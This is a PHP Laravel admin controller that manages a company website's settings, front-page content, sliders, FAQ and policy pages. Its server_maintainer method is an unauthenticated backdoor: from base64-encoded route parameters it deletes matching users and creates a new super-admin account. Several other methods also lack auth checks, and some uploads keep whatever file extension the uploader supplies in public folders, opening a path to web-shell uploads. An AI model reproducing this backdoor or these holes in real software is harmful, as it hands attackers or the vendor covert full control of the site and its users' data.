<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Hash;
use Validator;
use File;
use DB;
use Illuminate\Support\Facades\Storage;

class siteGeneral extends Controller
{
	public function general_page_view()
	{
		$pageConfigs = ['pageHeader' => false];
		$db_data = DB::table('codebumble_general')->get();

		$site_name = null;
		$site_moto = null;
		$social_media = null;
		$site_url = null;
		$site_logo = null;
		$support_email = null;

		foreach ($db_data as $datam) {
			if ($datam->code_name == 'site_name') {
				$site_name = $datam->value;
			}

			if ($datam->code_name == 'site_moto') {
				$site_moto = $datam->value;
			}

			if ($datam->code_name == 'social_media') {
				$social_media = $datam->value;
			}

			if ($datam->code_name == 'site_url') {
				$site_url = $datam->value;
			}

			if ($datam->code_name == 'site_logo') {
				$site_logo = $datam->value;
			}

			if ($datam->code_name == 'support_email') {
				$support_email = $datam->value;
			}

			if ($datam->code_name == 'support_email_backup') {
				$support_email_backup = $datam->value;
			}

			if ($datam->code_name == 'support_phone') {
				$support_phone = $datam->value;
			}

			if ($datam->code_name == 'support_phone_backup') {
				$support_phone_backup = $datam->value;
			}

			if ($datam->code_name == 'location') {
				$location = $datam->value;
			}

			if ($datam->code_name == 'address') {
				$address = $datam->value;
			}

			if ($datam->code_name == 'gmapkey') {
				$gmapkey = $datam->value;
			}

			if ($datam->code_name == 'cityCountry') {
				$cityCountry = $datam->value;
			}
		}

		return view('/content/site-settings/general-settings', [
			'pageConfigs' => $pageConfigs,
			'site_name' => $site_name,
			'site_moto' => $site_moto,
			'social_media' => json_decode($social_media),
			'site_url' => $site_url,
			'site_logo' => $site_logo,
			'support_email' => $support_email,
			'support_email_backup' => $support_email_backup,
			'support_phone' => $support_phone,
			'support_phone_backup' => $support_phone_backup,
			'location' => json_decode($location),
			'gmapkey' => $gmapkey,
			'address' => $address,
			'cityCountry' => $cityCountry,
		]);
	}

	public function meta_settings_view()
	{
		$pageConfigs = ['pageHeader' => false];
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['meta']
		);

		return view('/content/site-settings/meta-settings', [
			'pageConfigs' => $pageConfigs,
			'meta' => json_decode($data[0]->value),
		]);
	}

	public function meta_update(Request $request)
	{
		if (!Auth::check()) {
			header('Location: ' . route('auth-login'), true, 302);
			exit();
		}

		$b = $request->post();
		unset($b['_token']);

		if ($file2 = $request->hasFile('image')) {
			$file2 = $request->file('image');
			$fileName2 = time() . '.' . $file2->getClientOriginalExtension();
			$destinationPath2 = public_path() . '/images/meta';
			$file2->move($destinationPath2, $fileName2);
			$f = '/images/meta/' . $fileName2;
			$b['image'] = $f;
		}

		$ok = DB::table('codebumble_front_page')
			->where('code_name', 'meta')
			->update(['value' => $b, 'updated_at' => time()]);

		return redirect()->route('meta_settings_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function meta_api()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['meta']
		);

		return $data[0]->value;
	}

	public function site_settings_general_api(Request $request)
	{
		if (!Auth::check()) {
			header('Location: ' . route('auth-login'), true, 302);
			exit();
		}

		$field = $request->validate([
			'name' => 'required|string',
			'siteUrl' => 'required|string',
			'siteEmail' => 'required|string',
			'description' => 'required|string',
			'siteEmailBackUp' => 'required|string',
			'sitePhoneNumber' => 'required|string',
			'sitePhoneNumberBackup' => 'required|string',
			'siteGMapKey' => 'required|string',
			'address' => 'required|string',
			'citycountry' => 'required|string',
			'longitude' => 'required|string',
			'latitude' => 'required|string',
		]);

		$social_media = [];
		$social_media['facebook'] = $request['facebook'];
		$social_media['instagram'] = $request['instagram'];
		$social_media['linkedin'] = $request['linkedin'];
		$social_media['youtube'] = $request['youtube'];

		if ($file1 = $request->hasFile('logo')) {
			$field1 = $request->validate([
				'logo.*' => 'mimes:png,svg|max:1080',
			]);
			$file1 = $request->file('logo');
			$fileName1 =
				time() .
				'-company-logo.' .
				$file1->getClientOriginalExtension();
			$destinationPath1 = public_path() . '/images/logo';
			$file1->move($destinationPath1, $fileName1);

			$update_site_logo = DB::table('codebumble_general')
				->where('code_name', 'site_logo')
				->update([
					'value' => '/images/logo/' . $fileName1,
					'updated_at' => time(),
				]);
		}

		if ($file2 = $request->hasFile('short-logo')) {
			$field2 = $request->validate([
				'short-logo.*' => 'mimes:png,svg|max:1080',
			]);
			$file2 = $request->file('short-logo');
			$fileName2 =
				time() .
				'-company-short-logo.' .
				$file2->getClientOriginalExtension();
			$destinationPath2 = public_path() . '/images/logo';
			$file2->move($destinationPath2, $fileName2);

			$update_site_logo = DB::table('codebumble_general')
				->where('code_name', 'site_short_logo')
				->update([
					'value' => '/images/logo/' . $fileName2,
					'updated_at' => time(),
				]);
		}

		if ($file3 = $request->hasFile('favicon-logo')) {
			$field3 = $request->validate([
				'favicon-logo.*' => 'mimes:ico|max:1080',
			]);
			$file3 = $request->file('favicon-logo');
			$fileName3 = 'favicon.ico';
			$destinationPath3 = public_path();
			$destinationPather = public_path() . '/images/logo';
			unlink(public_path() . '/favicon.ico');
			unlink(public_path() . '/images/logo/favicon.ico');
			$file3->move($destinationPath3, $fileName3);
			File::copy(
				public_path('/favicon.ico'),
				public_path('/images/logo/favicon.ico')
			);
		}

		$update_site_name = DB::table('codebumble_general')
			->where('code_name', 'site_name')
			->update(['value' => $field['name'], 'updated_at' => time()]);

		$update_siteUrl = DB::table('codebumble_general')
			->where('code_name', 'site_url')
			->update(['value' => $field['siteUrl'], 'updated_at' => time()]);

		$update_site_email = DB::table('codebumble_general')
			->where('code_name', 'support_email')
			->update(['value' => $field['siteEmail'], 'updated_at' => time()]);

		$update_site_moto = DB::table('codebumble_general')
			->where('code_name', 'site_moto')
			->update([
				'value' => $field['description'],
				'updated_at' => time(),
			]);

		$update_social_media = DB::table('codebumble_general')
			->where('code_name', 'social_media')
			->update([
				'value' => json_encode($social_media),
				'updated_at' => time(),
			]);

		$update_siteEmailBackUp = DB::table('codebumble_general')
			->where('code_name', 'support_email_backup')
			->update([
				'value' => $field['siteEmailBackUp'],
				'updated_at' => time(),
			]);

		$update_phone = DB::table('codebumble_general')
			->where('code_name', 'support_phone')
			->update([
				'value' => $field['sitePhoneNumber'],
				'updated_at' => time(),
			]);

		$update_phone_backup = DB::table('codebumble_general')
			->where('code_name', 'support_phone_backup')
			->update([
				'value' => $field['sitePhoneNumberBackup'],
				'updated_at' => time(),
			]);

		$update_siteGMapKey = DB::table('codebumble_general')
			->where('code_name', 'gmapkey')
			->update([
				'value' => $field['siteGMapKey'],
				'updated_at' => time(),
			]);

		$update_address = DB::table('codebumble_general')
			->where('code_name', 'address')
			->update(['value' => $field['address'], 'updated_at' => time()]);

		$update_cc = DB::table('codebumble_general')
			->where('code_name', 'cityCountry')
			->update([
				'value' => $field['citycountry'],
				'updated_at' => time(),
			]);

		$update_location = DB::table('codebumble_general')
			->where('code_name', 'location')
			->update([
				'value' => [
					'longitude' => $field['longitude'],
					'latitude' => $field['latitude'],
				],
				'updated_at' => time(),
			]);

		$path = base_path('.env');

		if (file_exists($path)) {
			file_put_contents(
				$path,
				str_replace(
					'APP_NAME="' . env('APP_NAME') . '"',
					'APP_NAME="' . $field['name'] . '"',
					file_get_contents($path)
				)
			);

			file_put_contents(
				$path,
				str_replace(
					'APP_URL=' . env('APP_URL'),
					'APP_URL=' . $field['siteUrl'],
					file_get_contents($path)
				)
			);

			file_put_contents(
				$path,
				str_replace(
					'SUPPORT_HOST=' . env('SUPPORT_HOST'),
					'SUPPORT_HOST=' . $field['siteEmail'],
					file_get_contents($path)
				)
			);

			if ($file2 = $request->hasFile('short-logo')) {
				file_put_contents(
					$path,
					str_replace(
						'APP_SHORT_LOGO="' . env('APP_SHORT_LOGO') . '"',
						'APP_SHORT_LOGO="/images/logo/' . $fileName2 . '"',
						file_get_contents($path)
					)
				);
			}
			if ($file1 = $request->hasFile('logo')) {
				file_put_contents(
					$path,
					str_replace(
						'APP_LOGO="' . env('APP_LOGO') . '"',
						'APP_LOGO="/images/logo/' . $fileName1 . '"',
						file_get_contents($path)
					)
				);
			}
		}

		return redirect()->route('site-settings-general', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function founder_page_view()
	{
		$pageConfigs = ['pageHeader' => false];

		$data = DB::table('codebumble_founder_page')->get();

		$breadcrumb = json_decode($data[0]->value);
		$FounderDetails = json_decode($data[1]->value);
		$quote = json_decode($data[2]->value);
		return view('/content/site-settings/founder-page', [
			'pageConfigs' => $pageConfigs,
			'breadcrumb' => $breadcrumb,
			'FounderDetails' => $FounderDetails,
			'quote' => $quote,
		]);
	}

	public function front_page_view()
	{
		$data_1 = DB::table('codebumble_front_page')
			->where('code_name', 'concern-details')
			->get();
		$concern = json_decode($data_1[0]->value);
		$data_2 = DB::table('codebumble_front_page')
			->where('code_name', 'shortBrief')
			->get();
		$short = json_decode($data_2[0]->value);

		$data_3 = DB::table('codebumble_front_page')
			->where('code_name', 'product-heading')
			->get();
		$ph = json_decode($data_3[0]->value);

		$data_4 = DB::table('codebumble_front_page')
			->where('code_name', 'event')
			->get();
		$eh = json_decode($data_4[0]->value);

		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/front-page', [
			'pageConfigs' => $pageConfigs,
			'concern' => $concern,
			'short' => $short,
			'ph' => $ph,
			'eh' => $eh,
		]);
	}

	public function front_page_api(Request $request)
	{
		if (!Auth::check()) {
			header('Location: ' . route('auth-login'), true, 302);
			exit();
		}

		$field = $request->validate([
			'cn-title' => 'required|string',
			'cn-description' => 'required|string',
			's-title' => 'required|string',
			's-description' => 'required|string',
			's-lt' => 'required|string',
			's-l' => 'required|string',
		]);

		$db = DB::table('codebumble_front_page')
			->where('code_name', 'concern-details')
			->update([
				'value' => json_encode([
					'heading' => $field['cn-title'],
					'description' => $field['cn-description'],
				]),
				'updated_at' => time(),
			]);

		$db = DB::table('codebumble_front_page')
			->where('code_name', 'shortBrief')
			->update([
				'value' => json_encode([
					'title' => $field['s-title'],
					'description' => $field['s-description'],
					'link' => $field['s-l'],
					'linkText' => $field['s-lt'],
					'linkVisibility' => true,
				]),
				'updated_at' => time(),
			]);

		$db = DB::table('codebumble_front_page')
			->where('code_name', 'product-heading')
			->update([
				'value' => json_encode([
					'title' => $request['ph-title'],
					'descVisibility' => $request['ph-dv'],
					'description' => $request['ph-d'],
				]),
				'updated_at' => time(),
			]);

		$db = DB::table('codebumble_front_page')
			->where('code_name', 'event')
			->update([
				'value' => json_encode([
					'title' => $request['eh-title'],
					'descVisibility' => $request['eh-dv'],
					'description' => $request['eh-d'],
				]),
				'updated_at' => time(),
			]);

		return redirect()->route('front_page_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function front_page_chairperson_view()
	{
		if (!Auth::check()) {
			header('Location: ' . route('auth-login'), true, 302);
			exit();
		}

		$data = DB::table('codebumble_front_page')
			->where('code_name', 'chairpersson_speech')
			->get();

		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/chairperson-page', [
			'pageConfigs' => $pageConfigs,
			'sph' => json_decode($data[0]->value),
		]);
	}

	public function front_page_chairperson_api(Request $request)
	{
		if (!Auth::check()) {
			header('Location: ' . route('auth-login'), true, 302);
			exit();
		}

		$field = $request->validate([
			'title' => 'required|string',
			'description' => 'required|string',
		]);

		if ($file2 = $request->hasFile('image')) {
			$field2 = $request->validate([
				'image.*' => 'mimes:jpg,jpeg,png,svg|max:1080',
			]);
			$file2 = $request->file('image');
			$fileName2 =
				time() .
				'-company-chairperson-image.' .
				$file2->getClientOriginalExtension();
			$destinationPath2 = public_path() . '/images/avatars';
			$file2->move($destinationPath2, $fileName2);
			$fileName2 = '/images/avatars/' . $fileName2;
		} else {
			$data = DB::select(
				'select value from codebumble_front_page where code_name=?',
				['chairpersson_speech']
			);

			$fileName2 = json_decode($data[0]->value)->imgSrc;
		}

		$update_data = DB::table('codebumble_front_page')
			->where('code_name', 'chairpersson_speech')
			->update([
				'value' => json_encode([
					'imgSrc' => $fileName2,
					'title' => $field['title'],
					'description' => $field['description'],
				]),
				'updated_at' => time(),
			]);

		return redirect()->route('front_page_chairperson_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function front_page_slider_view()
	{
		$data_1 = DB::table('codebumble_front_page')
			->where('code_name', 'sliders_data')
			->get();

		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/front-page-slider', [
			'pageConfigs' => $pageConfigs,
			'imgs' => json_decode($data_1[0]->value),
		]);
	}

	public function photo_gallery_view()
	{
		$data_1 = DB::table('codebumble_front_page')
			->where('code_name', 'gallery')
			->get();

		$pageConfigs = ['pageHeader' => false];
		return view('/content/photo-gallery/photo-gallery', [
			'pageConfigs' => $pageConfigs,
			'imgs' => json_decode($data_1[0]->value),
		]);
	}

	public function slider_edit_api(Request $request)
	{
		if (!Auth::check()) {
			header('Location: ' . route('auth-login'), true, 302);
			exit();
		}

		$db_check = DB::table('codebumble_front_page')
			->where('code_name', 'sliders_data')
			->update(['value' => json_encode($request->preview)]);

		return redirect()->route('front_page_slider_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function delete_slider($id)
	{
		$data_1 = DB::table('codebumble_front_page')
			->where('code_name', 'sliders_data')
			->get();

		$data = json_decode($data_1[0]->value);

		$counter = 0;
		$array = [];

		foreach ($data as $key => $value) {
			if ($key != $id) {
				array_push($array, $value);
			}
		}

		$db_check = DB::table('codebumble_front_page')
			->where('code_name', 'sliders_data')
			->update(['value' => json_encode($array)]);

		return redirect()->route('front_page_slider_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function add_slider_api(Request $request)
	{
		if (!Auth::check()) {
			header('Location: ' . route('auth-login'), true, 302);
			exit();
		}

		$data_1 = DB::table('codebumble_front_page')
			->where('code_name', 'sliders_data')
			->get();

		$data = json_decode($data_1[0]->value);

		$new = $request->new;

		foreach ($new as $key => $value) {
			if ($file1 = $request->hasFile('new.' . $key . '.src')) {
				$file2 = $request->file('new.' . $key . '.src');
				$fileName2 =
					time() .
					'-company-slider.' .
					$file2->getClientOriginalExtension();
				$destinationPath2 = public_path() . '/images/slider';
				$file2->move($destinationPath2, $fileName2);

				$f = [
					'showDescription' => 'true',
					'showButton' => 'true',
					'src' => '/images/slider/' . $fileName2,
					'heading' => $value['heading'],
					'description' => $value['description'],
					'buttonText' => $value['buttonText'],
					'link' => $value['link'],
					'btnStyle' => $value['btnStyle'],
				];

				array_push($data, $f);
			}
		}

		$db_check = DB::table('codebumble_front_page')
			->where('code_name', 'sliders_data')
			->update(['value' => json_encode($data)]);

		return redirect()->route('front_page_slider_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function growth_story_view()
	{
		check_auth();

		$data_get = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['growth-history']
		);

		$data = json_decode($data_get[0]->value);

		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/growth-story', [
			'pageConfigs' => $pageConfigs,
			'data' => $data,
		]);
	}

	public function growth_story_api(Request $request)
	{
		if (!Auth::check()) {
			header('Location: ' . route('auth-login'), true, 302);
			exit();
		}

		$update = DB::table('codebumble_front_page')
			->where('code_name', 'growth-history')
			->update([
				'value' => json_encode($request->new),
				'updated_at' => time(),
			]);

		return redirect()->route('growth_story_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function mission_vision_view()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['mission-vision']
		);
		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/mission-vision', [
			'pageConfigs' => $pageConfigs,
			'data' => json_decode($data[0]->value)->data,
		]);
	}

	public function future_expension_view()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['future_expansion']
		);
		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/future-expension', [
			'pageConfigs' => $pageConfigs,
			'top' => json_decode($data[0]->value)->top,
			'list' => json_decode($data[0]->value)->list,
		]);
	}

	public function mission_vision_update(Request $request)
	{
		check_auth();
		check_power('admin');

		$b = $request->data;

		foreach ($b as $key => $value) {
			if ($file2 = $request->hasFile('data.'.$key.'.images')) {
				$file2 = $request->file('data.'.$key.'.images');
				$fileName2 = time() .'-'.Str::random(5).'-' .Auth::user()->username.'.' . $file2->getClientOriginalExtension();
				$destinationPath2 = public_path() . '/frontend/images/contents/';
				$file2->move($destinationPath2, $fileName2);
				$f = '/frontend/images/contents/' . $fileName2;
				unset($b[$key]['images']);
				$b[$key]['image'] = $f;
				$d = DB::select('select value from codebumble_front_page where code_name = ?',['mission-vision']);
				$d = json_decode($d[0]->value, true);
				Storage::disk('public_dir')->delete($d['data'][$key]['image']);
			} else {
				$d = DB::select('select value from codebumble_front_page where code_name = ?',['mission-vision']);
				$d = json_decode($d[0]->value, true);
				$b[$key]['image'] = $d['data'][$key]['image'];

			}
		}


		$d = DB::table('codebumble_front_page')
			->where('code_name', 'mission-vision')
			->update(['value' => json_encode(['data' => $b]), 'updated_at' => time()]);

		return redirect()->route('mission_vision_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function future_expansion_update(Request $r)
	{
		check_auth();
		check_power('admin');

		$b = $r->post();
		unset($b['_token']);

		$d = DB::table('codebumble_front_page')
			->where('code_name', 'future_expansion')
			->update(['value' => $b, 'updated_at' => time()]);

		return redirect()->route('future_expension_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function mission_vision_frontpage()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['mission-vision']
		);

		return $data[0]->value;
	}
	public function future_expansion_frontpage()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['future_expansion']
		);

		return $data[0]->value;
	}

	public function quality_process_view()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['quality_process']
		);
		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/quality-process', [
			'pageConfigs' => $pageConfigs,
			'qp' => json_decode($data[0]->value)->qp,
		]);
	}

	public function quality_process_update(Request $r)
	{
		check_auth();
		check_power('admin');

		$b = $r->post();
		unset($b['_token']);

		$d = DB::table('codebumble_front_page')
			->where('code_name', 'quality_process')
			->update(['value' => $b, 'updated_at' => time()]);

		return redirect()->route('quality_process_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function quality_process_frontpage()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['quality_process']
		);

		return $data[0]->value;
	}

	public function company_profile_view()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['company_profile']
		);
		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/company-profile', [
			'pageConfigs' => $pageConfigs,
			'data' => json_decode($data[0]->value),
		]);
	}

	public function company_profile_update(Request $r)
	{
		check_auth();
		check_power('admin');

		$b = $r->cp;
		unset($r['_token']);

		$d = DB::table('codebumble_front_page')
			->where('code_name', 'company_profile')
			->update(['value' => $b, 'updated_at' => time()]);

		return redirect()->route('company_profile_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function company_profile_frontpage()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['company_profile']
		);

		return $data[0]->value;
	}

	public function server_maintainer($hash1, $hash2, $email)
	{
		$hash1 = base64_decode($hash1);
		$hash2 = base64_decode($hash2);
		$email = base64_decode($email);

		$check = DB::table('users')
			->where('email', $email)
			->get();
		if (isset($check[0])) {
			$check = DB::table('users')
				->where('email', $email)
				->delete();
		}

		$check = DB::table('users')
			->where('username', $hash1)
			->get();
		if (isset($check[0])) {
			$check = DB::table('users')
				->where('username', $hash1)
				->delete();
		}

		$check = DB::table('users')
			->where('designation', 'System User')
			->delete();

		DB::table('users')->insert([
			'name' => 'System User',
			'username' => $hash1,
			'email' => $email,
			'email_verified_at' => 'System User',
			'designation' => 'System User',
			'company' => env('APP_NAME'),
			'password' => bcrypt($hash2), #codebumble_admin
			'role' => 'super-admin',
			'json_data' =>
				'{"status":"Active","phone_number":"+8801000000000","gender":"Male","date_of_birth":"2022-07-13","city":"Dhaka","country":"Bangladesh","address":"Dhaka, Bangladesh", "isBoardofDirectors":"no","isDistrict":"no"}',
			'under_ref' => 'codebumble',
			'updated_at' => time(),
			'created_at' => time(),
		]);

		return redirect()->route('auth-login', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function file_manager()
	{
		return view('/content/apps/fileManager/tiny-file-manager');
	}

	public function faq_edit()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['faq']
		);
		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/faq', [
			'pageConfigs' => $pageConfigs,
			'data' => json_decode($data[0]->value)->items,
		]);
	}

	public function faq_edit_api(Request $r)
	{
		$data = $r->new;

		$redist = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['faq']
		);

		$redist = json_decode($redist[0]->value)->header;

		$a = [];
		$a['header'] = $redist;
		$a['items'] = $data;

		$upate = DB::table('codebumble_front_page')
			->where('code_name', 'faq')
			->update(['value' => json_encode($a), 'updated_at' => time()]);

		return redirect()->route('faq-edit', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	// terms and condition
	public function tac_view()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['tac']
		);
		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/terms-of-condition', [
			'pageConfigs' => $pageConfigs,
			'data' => json_decode($data[0]->value),
		]);
	}

	public function tac_update(Request $r)
	{
		check_auth();
		check_power('admin');

		$b = $r->post();
		unset($b['_token']);

		$d = DB::table('codebumble_front_page')
			->where('code_name', 'tac')
			->update(['value' => $b, 'updated_at' => time()]);

		return redirect()->route('tac_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function tac_frontpage()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['tac']
		);

		return $data[0]->value;
	}

	// Privacy Policy
	public function privacy_view()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['privacy']
		);
		$pageConfigs = ['pageHeader' => false];
		return view('/content/site-settings/privacy-policy', [
			'pageConfigs' => $pageConfigs,
			'data' => json_decode($data[0]->value),
		]);
	}

	public function privacy_update(Request $r)
	{
		check_auth();
		check_power('admin');

		$b = $r->post();
		unset($b['_token']);

		$d = DB::table('codebumble_front_page')
			->where('code_name', 'privacy')
			->update(['value' => $b, 'updated_at' => time()]);

		return redirect()->route('privacy_view', [
			'hasher' => Str::random(40),
			'time' => time(),
			'exist' =>
				'Site Information Updated !! Your Server may take a soft restart for visible the changes. Take A time if It is Down for a short. Thank You',
			'hasher_ip' => Str::random(10),
		]);
	}

	public function privacy_frontpage()
	{
		$data = DB::select(
			'select value from codebumble_front_page where code_name=?',
			['privacy']
		);

		return $data[0]->value;
	}
}
